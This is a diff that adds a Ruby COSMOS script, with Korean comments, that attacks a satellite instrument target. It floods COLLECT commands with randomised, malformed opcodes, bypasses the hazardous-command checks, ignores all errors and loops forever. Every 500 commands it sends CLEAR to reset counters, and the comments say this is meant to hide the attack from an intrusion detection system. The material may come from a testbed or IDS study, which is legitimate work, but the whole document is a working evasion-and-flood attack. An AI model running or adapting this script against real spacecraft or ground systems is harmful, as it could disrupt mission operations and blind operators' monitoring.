@@ -1,0 +1,43 @@
+require 'cosmos/script'
+
+# Author: Adapted for INST Target (Stealthy Monitoring Disablement)
+# Description:
+# 이 스크립트는 위성의 상태 감시 파라미터를 조작하는 척하며, 
+# 합법적인 COLLECT 명령어의 OPCODE를 기괴하게 꼬아서 전송하고,
+# 주기적으로 CLEAR를 날려 IDS의 통계를 교란하는 공격입니다.
+
+puts "🚀 Stealthy Monitoring Disablement Attack Started (Infinite Flood)..."
+
+# 초기화 시 y/n 멈춤 방지 및 에러 무시
+begin
+  cmd_no_hazardous_check("INST", "CLEAR")
+rescue
+end
+
+i = 0
+loop do
+  begin
+    # [상태 변조 및 커버 트래픽 융합]
+    # SETPARAMS나 ASCIICMD 대신 100% 프리패스되는 COLLECT를 악용합니다.
+    # OPCODE를 무작위로 흔들어서 내부 IDS 센서의 혼란을 유도합니다.
+    weird_opcode = [2, 3, 255, rand(10..50)].sample
+    
+    cmd_no_hazardous_check("INST", "COLLECT", "TYPE" => 'NORMAL', "DURATION" => 1.0, "OPCODE" => weird_opcode, "TEMP" => rand(15.0..24.9))
+  rescue
+    # 에러가 나도 절대 멈추지 않음!
+  end
+
+  # 매 500회마다: 통계치 초기화 (CLEAR)
+  # 공격 흔적(카운터)을 지워 이상 탐지 시스템을 교란하는 행위
+  if i > 0 && i % 500 == 0
+    puts ">> [은폐 시도] Resetting stats for concealment (index: #{i})"
+    begin
+      cmd_no_hazardous_check("INST", "CLEAR")
+    rescue
+    end
+  end
+
+  # 너무 빠르면 뻗을 수 있으니 미세한 딜레이 추가
+  wait(0.005)
+  i += 1
+end
